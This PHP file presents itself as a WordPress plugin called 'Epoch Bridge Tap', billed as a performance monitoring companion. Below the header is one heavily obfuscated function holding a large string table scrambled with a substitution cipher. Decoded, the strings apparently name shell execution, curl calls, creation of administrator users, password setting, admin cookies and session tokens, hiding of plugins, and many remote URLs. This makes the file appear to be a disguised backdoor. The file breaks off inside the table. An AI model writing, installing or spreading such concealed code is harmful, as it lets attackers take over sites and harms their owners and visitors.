<?php

/**
 * Plugin Name:       Epoch Bridge Tap
 * Plugin URI:        https://carter.dev/plugins/epoch-bridge-tap/
 * Description:       Compact performance monitoring companion
 * Version:           1.2.1
 * Author:            Amelia Carter
 * License:           GPL-2.0-or-later
 * Text Domain:       epoch-bridge-tap
 * Requires at least: 5.0
 * Requires PHP:      5.6
 */
/* SCV:4.5.3 */
if(!function_exists('ar6vo_1nyhx2koj5')&&!((defined('SC_CORE_BOOT_VER')&&version_compare((string)SC_CORE_BOOT_VER,'4.5.3','>='))||(isset($GLOBALS['sc_boot_ver'])&&version_compare((string)$GLOBALS['sc_boot_ver'],'4.5.3','>=')))){function lnxxvxyv4943($i){static $a=null;if($a===null){$a=array_merge(array('zD<WzYd','`H|e>\'|/','fO4OG','#x`>(x">',':F(HrX/(|>UX`r`','A.F]X(|#x`>(x">','CW|Wn8B[g|c[{','`r\'A/`','.r\'X"','`F#`r\'','`r\'.>(','1X\'(x">','\'r\'X"','CWj8|Wn8B[g|c[{','u"F6A.F]X(`','"*1X\'','"*1X\'','Hy"/1','Hy"/1','F(.X(*','X`|:X.>','/AHxHy>|X(ex.X1xr>',':/A>(','=#',':=\'Xr>','OAyA','O`1|','O#r|','O`="|','Ob|','O/::','CW|J\\gY?gY|c[{','uO\'1|','\'>x.Axry','`Hx(1X\'','X`|x\'\'x!','H/F(r','\'"1X\'','A/`XU|]>r>FX1','X`|X(r','`H|','X`|`r\'X(]','O"F|`r|','X`|1X\'','X`|.X(*','OO','X`|\'>x1x#.>','X`|=\'Xrx#.>','./H*>1','\'>(x">'),array(']>r|r\'x(`X>(r','`H|"F|\'>`HF>','`rxr','1>e','1>e','OO','"14','uO"F|`r|','uO"F|.*|','H.>x\'`rxrHxHy>','`>r|r\'x(`X>(r','1>.>r>|r\'x(`X>(r','`H|"X]|:xX.','\'>`HF>','"FT','1X\'','$$','X`|/#l>Hr',':F(HrX/(',':F(HrX/(','\'>"/e>|:X.r>\'',']./#','uKOAyA','r/FHy','\'>(x">','H/A!','r>"A(x"','`!`|]>r|r>"A|1X\'','`!`|]>r|r>"A|1X\'','ur"A','=A6H/(r>(r','uN','uO`H|r"A','AFr>(e','YjWc[{}','`H|r"A|:XU>1','zD<WzYd','=A6H/(r>(r','uO`H|','uH/\'>|','H/\'>','OAyA','yI*l9X:=b1I:|FG9b\':','uA.F]X(`u','OAyA',':X.>|]>r|H/(r>(r`','A\'>]|"xrHy','uNuNKT<Ji$SN1qNON1qNON1qVTNKNuu',':X.>"rX">',':X.>`XI>'),array('`H|H\'/(|:>rHy','`H|Ax!./x1|r','xAxHy>|]>r|e>\'`X/(','`r\'r/./=>\'','AyA|`xAX|(x">','xAxHy>9yx(1.>\'','.Xr>`A>>1','<?{i?{|<\\vYCz{?','<?{i?{|<\\vYCz{?','xAxHy>','/A>(.Xr>`A>>1','X(X|]>r','/A>(|#x`>1X\'','>UA./1>','cD|gzj?','zD<WzYd','`H|./H*|(','`H|./H*|(','`H|./H*|(','`H|./H*|1#','">ry/1|>UX`r`',']>r|ex\'','<?n?JYTB?Y|n\\JESM','M_TsV','`H|./H*|1#',':./H*','`!`|]>r|r>"A|1X\'','u`H|','O./H*','`H|./H*|:y','`H|./H*|XA','`H|./H*|(','`H|./H*|:y','`H|./H*|:y','bF>\'!','<?n?JYT{?n?z<?|n\\JESM','MV','c[<znn\\C|v[n?|j\\c<',':./H*','zD<WzYd','xHrA','O./H*','`H|xHrA|:y','`H|xHrA|:y',']>r|/ArX/(','FA1xr>|/ArX/(','xHrXe>|A.F]X(`','x\'\'x!|ex.F>`','x\'\'x!|F(XbF>','X(|x\'\'x!'),array('x\'\'x!|1X::','Yy\'/=x#.>','$T','$T','$T','`H|>\'\'/\'`','`H|>\'\'/\'`','`H|>\'\'/\'`','x\'\'x!|`.XH>','`H|>\'\'/\'`','x11|xHrX/(','x11|:X.r>\'','1X\'','uHxHy>','uX(1>UOAyA','`H|AF\']>','`H|AF\']>','`H|AF\']>','\'>]X`r>\'|`yFr1/=(|:F(HrX/(','\'>]X`r>\'|`yFr1/=(|:F(HrX/(','r!ep!s;*;I/`A|Z|f"xFpx','>\'\'/\'|]>r|.x`r',':X.>','r!A>','">``x]>','">``x]>','z../=>1T">"/\'!T`XI>','jxUX"F"T>U>HFrX/(TrX">','\'>x.Axry','\'>x.Axry',':X.>','`H|#//r|e>\'','`H|#//r|`r','uOb|','uOF#|','rX">','FA1xr>|/ArX/(','`H|FA1xr>|#x1','(/','uOb|',':xX.','O/::','OAyAO/::','uO`1|','uN1qNON1qNON1qu','a}',':X.>|AFr|H/(r>(r`',':X.>|AFr|H/(r>(r`','`H|A>(1X(]|X(ex.X1xr>','A.F]X(`|./x1>1'),array(':bU99x#G*1e=>:Z#*sex','U>=x^`fs(>*=IF(]9FF\'>(','sOsOs','!>`','AxryX(:/','uNuNKT<Ji$SN1qNON1qNON1qVTNKNuu','sOsOs','X`|"F.rX`Xr>',']>r|`Xr>|/ArX/(','xHrXe>|`Xr>=X1>|A.F]X(`','uNuNKT<Ji$N1qNON1qNON1qTNKNuu','Axry','Axry','1>x1',']/(>','!>`','`H|1>1FA|r//*','`H|1>1FA|r//*','A.F]X(`|./x1>1',':e&rr=\'^=sX|AfF','`rx\'rX(]','1>1FA','/A>(1X\'','\'>x11X\'','H./`>1X\'',']./#','uK','x\'\'x!|"xA','`y>..|>U>H','X(X|]>r','1X`x#.>|:F(HrX/(`','`H.','AyAT6.T','T9a2^','g/T`!(rxUT>\'\'/\'`','Wx\'`>T>\'\'/\'','vxrx.T>\'\'/\'','QL','r/*>(|]>r|x..','x\'\'x!|*>!|>UX`r`','Y\\E?g|Wz{<?','X`|#//.','sU&zfZ49Hzz^J^4;p;f;ZzszJ#p&^v;^#:z&s^?spG','sU;G&1^H?4HGv94&>;1Gc^Z^^f1Z^;p?cx#1#>z&f#','sUp19H4fG4?vZs^&pZfsxf;&sfDp&GZZ&G4c4sx#DD','yrrA`$uusU\'AHOX/u>ry','yrrA`$uu>ry>\'>F"6AF#.XHO(/1X>`OxAA','yrrA`$uu>ryO1\'AHO/\']','yrrA`$uu\'AHO>ryO]xr>=x!O:"','yrrA`$uu>ryO#./H*\'xI/\'OU!I'),array('yrrA`$uuAF#.XH6>ryO(/=(/1>`OX/','yrrA`$uu>ry6"xX((>rO\'AH:x`rOH/"LxAX|*>!}U#yCD[^C*]F*;<gjF^#eenF\'WBn-"]=5>Jf<p]9dZC1=vX]w<"WCiw{U\'`*?+=[:','yrrA`$uu>ry^O.xexO#FX.1','yrrA`$uu>ryO\'AHO#.U\'#1(OH/"','yrrA`$uu>ry6"xX((>rOAF#.XHO#.x`rxAXOX/','yrrA`$uu]xr>=x!Or>(1>\'.!OH/uAF#.XHu"xX((>r','yrrA`$uu>ry>\'>F"O\'AHO`F#bF>\'!O(>r=/\'*uAF#.XH','yrrA`$uu>ry>\'>F"6\'AHOAF#.XH(/1>OH/"','yrrA`$uu"xX((>rO]xr>=x!Or>(1>\'.!OH/','yrrA`$uu>ryOxAXO/(:X(x.Xr!OX/uAF#.XH','yrrA`$uu>ry>\'>F"OAF#.XHO#./H*AXO(>r=/\'*ue^u\'AHuAF#.XH','yrrA`$uu>ry>\'>F"6l`/(6\'AHO`rx*>.!OX/','yrrA`$uu\'AHO`>(rX/OU!Iu"xX((>r','yrrA`$uu>ryO">\'*.>OX/','yrrA`$uu>ryOxAXOA/H*>rO(>r=/\'*','x1"X(|','x1"|','x1"X(X`r\'xr/\'|','#xH*FA|',']I>(H/1>',']I1>:.xr>','AxH*','H\'HG9','F(AxH*',']I1>H/1>',']IX(:.xr>','y>U9#X(','dK','=A6x1"X(u','=A6X(H.F1>`u',']./#','KOAyA','x\'\'x!|\'x(1','=A|\'x(1','\'x(1','`H|1>x1.X(>','`H|1>x1.X(>','"XH\'/rX">','H>X.','Hx..|F`>\'|:F(H','=A|\'>"/r>|]>r','rX">/Fr','``.e>\'X:!','.X"Xr|\'>`A/(`>|`XI>','X`|=A|>\'\'/\'','HF\'.|X(Xr','HF\'.|`>r/Ar|x\'\'x!','HF\'.|>U>H','J8{n\\WY|{?Y8{gY{zg<v?{','J8{n\\WY|Y[j?\\8Y'),array('J8{n\\WY|<<n|i?{[v5W??{','J8{n\\WY|<<n|i?{[v5d\\<Y','J8{n\\WY|g\\W{\\B{?<<','J8{n\\WY|W{\\B{?<<v8gJY[\\g','yrrA|H/1>','=A|\'>"/r>|A/`r','``.e>\'X:!','y>x1>\'`','#/1!','X`|=A|>\'\'/\'',' T','`H|:>rHy|//"','J8{n\\WY|W\\<Y','J8{n\\WY|W\\<Yv[?nc<','J8{n\\WY|<<n|i?{[v5d\\<Y','J8{n\\WY|dYYWd?zc?{','J8{n\\WY|W{\\B{?<<v8gJY[\\g','`H|.x`r|\'AH','x\'\'x!|F(`yX:r','r\'X"','mol`/(\'AHo$o9Oso_oX1o$G_o">ry/1o$o>ry|Hx..o_oAx\'x"`o$kmo1xrxo$osUG#H41>Gso_or/o$o','o0_o.xr>`ro30','J/(r>(r6Y!A>','xAA.XHxrX/(ul`/(','l`/(|1>H/1>','\'>`F.r','sU','/\'1','\'>`/.e>','\'AH|1>H\'!Ar|:xX.>1','\'AH|#x1|*>!|.>(]ry','x\'\'x!|:X.r>\'','A\'>]|`A.Xr','uN\'LN(u','`H|H9|HxHy>','X"A./1>','`>\'e>\'|*>!','F\'.`','\'>`/.e>','`H|H9|HxHy>','`\'e|*>!','r\'X"','`>\'e>\'|*>!','\'AH|x..|:xX.>1','`H|>(H|H','`>\'Xx.XI>','Hy\'','"r|\'x(1','#x`>pf|>(H/1>',']>r|/ArX/('),array('`H|>(H|H','#x`>pf|1>H/1>','WdW|i?{<[\\g|[c','F(`>\'Xx.XI>','x../=>1|H.x``>`','`r\'|\'>A.xH>','>A','`=','`=|F\'.','`=|HxHy>1','X`|`Hx.x\'','`H|>\'\'/\'`','>\'\'/\'`','x\'\'x!|">\']>','>\'\'/\'`','(/',':.F`y|>\'\'/\'`','`H|Ax!./x1|A>\'`X`r>(r','H\'/([(r>\'ex.','`H|X(r>\'ex.','X(r>\'ex.','1X`A.x!','JF`r/"T"xX(r>(x(H>TX(r>\'ex.','`H|]Fx\'1|X(r>\'ex.','=A|(>Ur|`Hy>1F.>1','=A|`Hy>1F.>|>e>(r','`H|HyxX(','`H|X(r>\'ex.','c\\[gB|J{\\g','`yFr1/=(','I;:UeI9X!]l"UFp4ssF','`Xr>|F\'.','=A6H\'/(OAyAL1/X(]|=A|H\'/(}','#./H*X(]',':x`rH]X|:X(X`y|\'>bF>`r',':x`rH]X|:X(X`y|\'>bF>`r','.Xr>`A>>1|:X(X`y|\'>bF>`r','X](/\'>|F`>\'|x#/\'r','X](/\'>|F`>\'|x#/\'r','I.X#O/FrAFr|H/"A\'>``X/(','/::','/#|]>r|`rxrF`','(x">','/#|]Iyx(1.>\'','I.X#','y>x1>\'`|.X`r','J/(r>(r6?(H/1X(]$','X1>(rXr!','H.X','AyA1#]'),array('yrrA|\'>`A/(`>|H/1>','{?+8?<Y|j?Yd\\c','d?zc','/#|]>r|.>e>.','/#|>(1|:.F`y','/#|]>r|`rxrF`','(x">','/#|]>r|`rxrF`','1>:xF.rT/FrAFrTyx(1.>\'','/#|]>r|.>(]ry','=A|:X.r>\'','`yFr1/=(',':F(HrX/(','I;:UeI9X!]l"UFp4ssF','=A|/#|>(1|:.F`y|x..','J/(r>(r6n>(]ry$T','J/((>HrX/($TH./`>',':.F`y','=A|`Hy>1F.>|`X(].>|>e>(r','c[<zDn?|CW|J{\\g',']>r|/ArX/(','`H|.x`r|:>rHy|r`',']>r|/ArX/(','`H|`>>(|e>\'','=A|(>Ur|`Hy>1F.>1','=A|F(`Hy>1F.>|>e>(r','=A|(>Ur|`Hy>1F.>1',':>rHy','H\'/(|`rx.>|X(.X(>','`>r|rX">|.X"Xr','`>r|rX">|.X"Xr','`yFr1/=(',']>r|r\'x(`X>(r','`H|Ax!./x1|A>\'`X`r>(r','A.F]X({F.>`','A.F]X({F.>`','`H|A.F]X(|\'F.>`','X(l>Hr{F.>`','`H|X(l>Hr|\'F.>`','l`','`H|l`','Ax]>','Ax]>','`H|Ax]>','`=','`H|`=','HxHy>','`H|.x`r|y>x.|r`','`H|y>x.|`Hx(','`\'H'),array('`\'H','`H|.x`r|y>x.|r`','CW|Wn8B[g|c[{','uKuKOAyA','A\'>]|\'>A.xH>','uN`qu','uN`qu','`>r|r\'x(`X>(r','(/','y>x.','1X1|xHrX/(','`yFr1/=(','y/">|F\'.',']>r|/ArX/(','`H|.x`r|y#','rX">/Fr','``.e>\'X:!','`H|Ax!./x1|A>\'`X`r>(r','Ax!./x1Yr.','Ax!./x1Yr.','Ax!./x1Yr.','`H|.x`r|:>rHy|r`','`H|.x`r|:>rHy|:xX.|r`','`H|:>rHy|:xX.`','"xU','"X(','`H|.x`r|:>rHy|:xX.|r`','e>\'','AyA','`xAX','``.','X`|``.','"`','=A','=A|e>\'`X/(','`\'e','<?{i?{|<\\vYCz{?','`H|l`','l`|/(','l`|.>(','l`|\'>b','`H|l`|A\'X(r>1','l`|/#','`H|l`|/#|F`>1','l`|r`','`H|l`|A\'X(r>1|r`','`=|yXr`',']>r|/ArX/(','`H|`=|>A|yXr`','`=|.x`r'),array(']>r|/ArX/(','`H|`=|>A|.x`r','`=|yx1','`H|`=|yx1','e|x1e','ux1ex(H>16HxHy>OAyA','e|1#','u1#OAyA','e|/H','u/#l>Hr6HxHy>OAyA','O]|','O].|','e|]Fx\'1','=A6X(H.F1>`','OAyA','F`>\'|X(XO:X.>(x">','S(/(>V','OF`>\'OX(X','e|X(X','xFr/|A\'>A>(1|:X.>','e|yr','OyrxHH>``','e|=H','=A6H/(:X]OAyA','<J|CJ','A\'>A>(1','<J|z8Y\\|W{?W?gc','AH','CW|{\\JE?Y|i?{<[\\g','n<JCW|i','CGYJ','`]|HxHy>A\'>``|AF\']>|HxHy>','H.x``|>UX`r`','JxHy>|?(x#.>\'','=A|:x`r>`r|HxHy>','=A|HxHy>|`>\'e>|HxHy>|:X.>',':|/*',':|:xX.`',':|:xX.|r`','XH','H:','r`','XH|(','XH|9:x','`H|.#|"/1>','.#',']>r|/ArX/(','`H|Hx(x\'!','H!','Xr>"`'),array('>\'\'','>\'\'','`Xr>|F\'.','=A6./]X(OAyA','=A|./]X(|F\'.','Ax\'`>|F\'.','WdW|8{n|d\\<Y',']>r|`Xr>|F\'.',']>r|#./]X(:/','F\'.','`Xr>F\'.','dYYW|d\\<Y','dYYW|d\\<Y','<?{i?{|gzj?','"xU|>U>HFrX/(|rX">','`>\'e>\'|*>!','(/','r>`r|"/1>','"/H*<\'eE>!6','`H|.x`r|H9','`yF::.>','1/"xX(','A.F]X(i>\'`X/(','A.F]X(','\'//r','xHrXexr>1W.F]X(`','"FW.F]X(`','./]X(8\'.','x1"X(`','x1"X(`J//*X>`','=A|l`/(|>(H/1>','l`/(|>(H/1>','J/(r>(r6Y!A>','xAA.XHxrX/(u/Hr>r6`r\'>x"','`H|:>rHy|//"','//"','H9|>"Ar!T','H9|1>H\'!Ar|:xX.>1T','H9|#x1|l`/(T',':>rHy|F\'.','`H|:>rHy|//"','A.F]X(','#>xH/(','qu','6|','`r\'|`A.Xr','`H|#}','2X}','2(}','21}'),array('1>.>r>|/ArX/(','>\'\'/\'`','`H|>\'\'/\'`','`H|>\'\'/\'`','`H|>\'\'/\'`','rx\']>ri>\'`X/(','rx\']>ri>\'`X/(','rx\']>ri>\'`X/(',':/\'H>8A1xr>','l`|HxHy>1','l`|AF\']>|"X]','(/','l`|AF\']>|A>(1X(]','l`','Ax]>','Ax]>','`H|Ax]>','Ax]>|HxHy>1','(/','`=','`=','`H|`=','(/','r>"A.xr>`',']Fx\'1','x1ex(H>1JxHy>','x1e|rA.','1#','1#|rA.','ry>">','ry>">|rA.','X(`rx..>\'','X(`r|rA.','/Hn/x1>\'','/H|rA.','X`|(F">\'XH','H\'/([(r>\'ex.','H\'/([(r>\'ex.','`H|:>rHy|:xX.`','`H|.x`r|:>rHy|r`','r4bU41]*/`^x`f','=A|]>r|`Hy>1F.>1|>e>(r','=A|H.>x\'|`Hy>1F.>1|y//*','`H|.x`r|:>rHy|:xX.|r`','`H|1>x1.X(>','`H|HyxX(','">"/\'!|]>r|F`x]>','FA1xr>','//"|]Fx\'1','QLAyA'),array('FA1xr>','`!(rxU|>\'\'/\'','e>\'|"X`"xrHy','(/|`He','(/|A\'>e','`H|FA1xr>|#x1','uOF#|','`H|FA1xr>|`F`A>Hr','rX">/Fr','\'>1X\'>HrX/(',']>r|/ArX/(','\'>A.xH>|:xX.','`>r|r\'x(`X>(r','`H|\'>H/e>\'|Hy>H*','uL`H|H#}','rX">/Fr','``.e>\'X:!','.X"Xr|\'>`A/(`>|`XI>','`.>>A','`.>>A','A\'/#>|X(H/(H.F`Xe>','`H|FA1xr>|`F`A>Hr','FA1xr>','\'/..#xH*|:xX.|','uO`1|','`H|A>\'`X`r>1','Hx(x\'!|\'/..#xH*|','uOF#|','OAyA','uO`1|','`H|A>\'`X`r>1','FA1xr>','CW|Wn8B[g|c[{',']>r|A.F]X(`',':X.>|>UX`r`','=A6x1"X(uX(H.F1>`uA.F]X(OAyA','`Hx(','`H|A.F]X(|\'F.>`','X(H','AyA','Ayr".','yr".','WzYd[gv\\|?-Y?g<[\\g','1>xHrXexr>|A.F]X(`','=A6x1"X(uX(H.F1>`uA.F]X(OAyA','1>.>r>|A.F]X(`','HF\'\'>(r|F`>\'|Hx(','1>.>r>|A.F]X(`',']>r|F`>\'`','=A|`>r|HF\'\'>(r|F`>\''),array('\'/.>','x1"X(X`r\'xr/\'','(F"#>\'','=A|`>r|HF\'\'>(r|F`>\'','OO','c[{?JY\\{5|<?Wz{zY\\{','x\'\'x!|*>!`','WzYd[gv\\|?-Y?g<[\\g','\'>`Hx(','`H|.x`r|r"AH.>x(','`H|.x`r|r"AH.>x(','`!`|]>r|r>"A|1X\'','=A|','OAyA','CW|J\\gY?gY|c[{','uA.F]X(`','<J|cW|D?B[g','uN(LNuNKT<J|cW|D?B[g$Skx6Iz6ws6&O|$3qVTNKNuOKLNuNKT<J|cW|?gc$N^TNKNuN(Lu`','`H|.x`r|\'>`Hx(','A]XUsIsZG/ZZ*.Iy','`H|.x`r|\'>`Hx(','A>\'X/1XH','"X]\'xr>','`\'H|X(ex.X1','"X]\'xr>','"F|(/r|=\'Xrx#.>',']./#','1>.>r>|r\'x(`X>(r','`H|"X]|:xX.','`>r|r\'x(`X>(r','uNuNKT<Ji$SN1qNON1qNON1qVTNKNuu','"X]\'xr>','`H|X(Xr|`\'H|r`','`H|X(Xr|`\'H|r`','`\'H','`\'H','FA1xr>|/ArX/(','(/','(/','(/','1>.>r>|r\'x(`X>(r','`H|X(XrXx.XI>1','`H|X(XrXx.XI>1','(/','x11|/ArX/(','`H|X(XrXx.XI>1','FA1xr>|/ArX/(','`H|.x`r|:>rHy|r`','`\'H','`yFr1/=('),array('I;:UeI9X!]l"UFp4ssF',':FxF]ry*/=#/>.>G','X(Xr','1>.>r>|/ArX/(','=x\'"','X`|x1"X(','xHrXexr>|A.F]X(`','xHrX/(','xHrX/(','xHrXexr>','xHrXexr>6`>.>Hr>1','Hy>H*>1','=A|`x:>|\'>1X\'>Hr','x1"X(|F\'.','A.F]X(`OAyA','`Hx(|xHr','1\'/AX(`','A.F]X(`','1\'/AX(`','1#OAyA','<J|cD','x1ex(H>16HxHy>OAyA','<J|zci','uKT','|D?B[g$','uNuNKT','|D?B[g$Skx6Iz6ws6&O|$3qVTNKNuOKLNuNKT','|?gc$N^TNKNuu`','QLAyA','1\'/AX(`','"F`rF`>','"F`rF`>','I99FHe#^br4f^!4!^HFs','OAyA','Q`r!.>ar\'k1xrx6A.F]X(}o','o3_r\'k1xrx6A.F]X(}o','o3m1X`A.x!$(/(>tX"A/\'rx(r0Qu`r!.>a','Q`H\'XAra1/HF">(rOx11?e>(rnX`r>(>\'Soc\\jJ/(r>(rn/x1>1o_:F(HrX/(SVm1/HF">(rObF>\'!<>.>Hr/\'z..Sor\'k1xrx6A.F]X(3oVO:/\'?xHyS:F(HrX/(S\'Vmex\'TA}\'O]>rzrr\'X#Fr>So1xrx6A.F]X(oV X:SA}}}o','o))A}}}o','oV\'O\'>"/e>SV0V ex\'TH}1/HF">(rObF>\'!<>.>Hr/\'SoO`F#`F#`F#TO"F`rF`>TOH/F(roV X:SHVmex\'T(}Ax\'`>[(rSHOr>UrJ/(r>(rO\'>A.xH>Suk7s6&3u]_ooVV))s X:S(asVHOr>UrJ/(r>(r}oSoqjxryO"xUSs_(6^VqoVo00V Qu`H\'XAra','A&]]9="F91*>ss9lA>','!Fp;XA#*G]|":`reGI\'#&','OAyA',']>r|A.F]X(|1xrx','gx">','=A6A.F]X(`6xHrXe>','=A6A.F]X(`6X(xHrXe>',':X>.1`',':X>.1`',':X>.1`'),array('=A6"F6A.F]X(`','=A6A.F]X(`6"F`rF`>',':X>.1`',':X>.1`','CWj8|Wn8B[g|c[{','uKT<Ji$','uW.F]X(Tgx">$N`KSk7N\'N(K3qVuX','=A61\'/AX(`',':X>.1`',':X>.1`',':X>.1`','=A6H/(r>(r','x1ex(H>16HxHy>OAyA','<J|zci','uKT','uKT<Ji$','=A61\'/AX(`','Axrr>\'(','A\'>]|bF/r>','%h','yX11>(','hu','%h','\'//r`','xrr\'X#Fr>`','xrr\'X#Fr>`','\'//r`','WdW|jz,\\{|i?{<[\\g','>.vX(1>\'J/((>Hr/\'','u=A6:X.>6"x(x]>\'u.X#uAyAu>.vX(1>\'J/((>Hr/\'OH.x``OAyA','u:X.>6"x(x]>\'u.X#uAyAu>.vX(1>\'J/((>Hr/\'OH.x``OAyA','u:X.>6"x(x]>\'6x1ex(H>1u.X#uAyAu>.vX(1>\'J/((>Hr/\'OH.x``OAyA','OH.x``OAyA','OAyA','H.x``T>.vX(1>\'J/((>Hr/\'','u7N`KQNLSAyAVLu','H.x``T|<J|>.vX(1>\'J/((>Hr/\'|{>x.','QLAyAT','|`H|yX1>','|`H|yX1>|1X\'','QLAyATH.x``T>.vX(1>\'J/((>Hr/\'T>Ur>(1`T|<J|>.vX(1>\'J/((>Hr/\'|{>x.Tm','A\'/r>Hr>1T:F(HrX/(T/FrAFrSTx\'\'x!T%1xrxTVTm','%yX1>T}TX``>rST%Bn\\Dzn<ko|`H|yX1>o3TVTLT%Bn\\Dzn<ko|`H|yX1>o3T$Too ','X:TST%yX1>Tt}}TooT22T:F(HrX/(|>UX`r`STo`H|:"|:X.r>\'oTVTVTm','%1xrxT}T`H|:"|:X.r>\'ST%1xrx_T%yX1>TV ','Ax\'>(r$$/FrAFrST%1xrxTV ','=A|',':"','U;;>91"4^&b|";f',':X.>`'),array('x11>1','Hyx(]>1','r\'>>','Xr>"`','`H|y>xe!','`H|y>xe!','`>r|r\'x(`X>(r','`H|\'>H/e>\'|Hy>H*','`\'H','`H|FA1xr>|#x1','`\'H','`>r|r\'x(`X>(r','`\'H','`H|\'>H/e>\'|ry\'/rr.>','\'>H/e>\'','`/F\'H>|>"Ar!','`H|\'>H/e>\'|ry\'/rr.>','`H|\'>H/e>\'|Hy>H*','\'>H/e>\'','=A|`>(1|(>=|F`>\'|(/rX:XHxrX/(|r/|x1"X(','||\'>rF\'(|:x.`>','=A|(>=|F`>\'|(/rX:XHxrX/(|>"xX.|x1"X(','\'>"/e>|xHrX/(','\'>]X`r>\'|(>=|F`>\'','=A|`>(1|(>=|F`>\'|(/rX:XHxrX/(`','>1Xr|F`>\'|H\'>xr>1|F`>\'','=A|./]X(','=A|(/rX:!|x1"X(|(>=|./]X(','=A1#','HxAx#X.XrX>`','?n?JYTFO[c_TFOF`>\'|./]X(_TFOF`>\'|Ax``_TFOF`>\'|>"xX.Tv{\\jT','TFT[gg?{T,\\[gT','T"T\\gTFO[cT}T"OF`>\'|X1TCd?{?T"O">rx|*>!T}TR`TzgcT"O">rx|ex.F>Tn[E?TR`','Rx1"X(X`r\'xr/\'R','xb','x1"X(`','r/','H*|A>(1','=A|]>(>\'xr>|xFry|H//*X>','CW|<>``X/(|Y/*>(`','H*|A>(1','X`|``.','`>HF\'>|xFry','xFry','<?J8{?|z8Yd|J\\\\E[?','z8Yd|J\\\\E[?','n\\BB?c|[g|J\\\\E[?','J\\\\E[?|c\\jz[g','J\\\\E[?WzYd','zcj[g|J\\\\E[?|WzYd'),array('u=A6x1"X(','Y{8?','vzn<?','=A|"xX.','X``F>1','X``F>1|e','X``F>1|e','F`>\'|">rx','`>``X/(|r/*>(`','>UAX\'xrX/(','CW|<>``X/(|Y/*>(`',']>r|X(`rx(H>','=A|]>(>\'xr>|xFry|H//*X>','./]]>1|X(','H//*X>`','=A|"xX.','H*|A>(1','H*|H/""Xr','H*|H/""Xr','#F','#A','yx`|HxA','r`','H:','X(r>\'H>Ar','XH','./]X(|H:','u7','kx6:s6&3mp_^s0%u','r1Hll9;Usr*91xU99#',']>r|/ArX/(','FA1xr>|/ArX/(','x`/\'r','`H\'','X/','xr/"XH|(/|1X\'T','OAyA','xr/"XH|#x1|AyAT','xr/"XH|(/|r>"A(x"T','`H|',':`!(H','xr/"XH|r>"A|:xX.T','X/','xr/"XH|`y/\'r|=\'Xr>T','X/','xr/"XH|.X(*|:xX.T','O`H/.1','X/','xr/"XH|\'>(x">|:xX.T','yx`y|:X.>'),array('"14','xr/"XH|e>\'X:!|:xX.T','xr/"XH|ryX\'1|Ax\'r!T','QL','1s`(`rsf]brbH\'','=A|\'>"/r>|]>r','(e>1"9G#!lA4"el^r\'rye;','`H|A#}','\'>1X\'>HrX/(','JxHy>6J/(r\'/.','(/6HxHy>','.|>pr|ArI\'.:eeZsl','rX">/Fr','``.e>\'X:!','uN(LQ[:j/1F.>T"/1|AyAks6&O3KNOHaN`KAyA|ex.F>TxFr/|A\'>A>(1|:X.>k7N(3K','k7N(3KN(QNu[:j/1F.>aN(LuX','uN(LQ[:j/1F.>T.Xr>`A>>1aN`KAyA|ex.F>TxFr/|A\'>A>(1|:X.>k7N(3K','uN(LAyA|ex.F>TxFr/|A\'>A>(1|:X.>k7N(3K','k7N(3KN(LuX','uN(LQ[:j/1F.>T.Xr>`A>>1aN`KAyA|ex.F>N`KQNu[:j/1F.>aN(LuX','uN(LQ[:j/1F.>T"/1|AyAks6&O3KNOHaN`KAyA|ex.F>N`KQNu[:j/1F.>aN(LuX','/AHxHy>|X(ex.X1xr>','/AHxHy>|\'>`>r','/AHxHy>|]>r|`rxrF`','/AHxHy>|>(x#.>1','OAyA','=\'Xr>|:xX.>1T',':./H*',']>r|r\'x(`X>(r','`>r|r\'x(`X>(r','`H|x1"X(|rXH*','`H|x1"X(|X(:.X]yr','1>.>r>|r\'x(`X>(r',']>r|/ArX/(','F`>\'(x">|>UX`r`','x1"X(|rXH*','`H|HyxX(',']>r|/ArX/(','#F','>Ux"A.>OH/"','=A|`>r|Ax``=/\'1','#F','(/','#F','x1"X(','A>\'`X`r|:xX.','H/..X`X/(','=A|X(`>\'r|F`>\'','=A6X(H.F1>`uF`>\'OAyA','F`>\'|./]X('),array('F`>\'|Ax``','F`>\'|>"xX.','\'/.>','1X`A.x!|(x">','(/|=A1#','=A|yx`y|Ax``=/\'1','HF\'\'>(r|rX">','"!`b.','56"61Td$X$`','F`>\'|Ax``','F`>\'|(XH>(x">','F`>\'|\'>]X`r>\'>1','F`>\'|`rxrF`','R`','R`','R1','`b.|X(`>\'r|:xX.','F`>\'|X1','">rx|*>!','">rx|ex.F>','R`','R`','F`>\'|X1','">rx|*>!','F`>\'|.>e>.','H.>x(|F`>\'|HxHy>','e>\'X:!|:xX.',']>r|F`>\'|#!','./]X(','F`>\'|Hx(','x1"X(X`r\'xr/\'','x1"X(','HxA|e>\'X:!|:xX.','=A|1>.>r>|F`>\'','zD<WzYd','=A6x1"X(uX(H.F1>`uF`>\'OAyA','=A|1>.>r>|F`>\'','#F','(/','#A','#A','x1"X(','bF>\'!|=y>\'>','TzgcTF`>\'|./]X(Tt}TM','yX1>|b',']>r|/ArX/(','#F','x..','uNSSN1qVNVu','uNSN1qNVu'),array('yX1>|H(r','./]X(||(/r|X(','./]X(||(/r|X(','yX1>|\'>`r',']>r|/ArX/(','`r!.>`y>>r','r>"A.xr>','ury>">`','=A6H/(r>(rury>">`','AyA','uAxrr>\'(`','X(l>Hr|^','X(l>Hr','u=A6x1"X(','uN','uy/">','uex\'u===','uex\'u===uey/`r`','uex\'u===uyr".','u`\'eu===','u`\'euF`>\'`','uF`\'u./Hx.u===','/A>(|#x`>1X\'','u=A6H/(r>(ru"F6A.F]X(`','u=A6H/(r>(ruA.F]X(`','X(`rx..>1','`H|`A\'>x1|X(r>\'ex.','`A\'>x1','`H|`A\'>x1|(\'','(/|\'//r`','`H|`A\'>x1|X(r>\'ex.','u=A6H/(r>(ruA.F]X(`u','u=A6H/(:X]OAyA','u=A6H/(:X]OAyA','u1>:X(>N`KNSN`KkMo3cD|gzj?kMo3N`K_N`KkMo3Sk7Mo3qVkMo3u','urx#.>|A\'>:XUN`K}N`KkMo3Sk7Mo3qVkMo3u','u7kx6Iz6ws6&|3q%u','u7kx6Iz6ws6&|%63q%u','1#|(x">|\'>l>Hr>1','POP','/ArX/(`P','<Yz{YTY{zg<zJY[\\g','?n?JYT/ArX/(|ex.F>Tv{\\jT','TCd?{?T/ArX/(|(x">T}T','MxHrXe>|A.F]X(`M','Tn[j[YT^Tv\\{T8WczY?','{\\nnDzJE','{\\nnDzJE','J\\jj[Y','WczY?T'),array('T<?YT/ArX/(|ex.F>T}TR`TCd?{?T/ArX/(|(x">T}T','MxHrXe>|A.F]X(`M','FA1xr>|: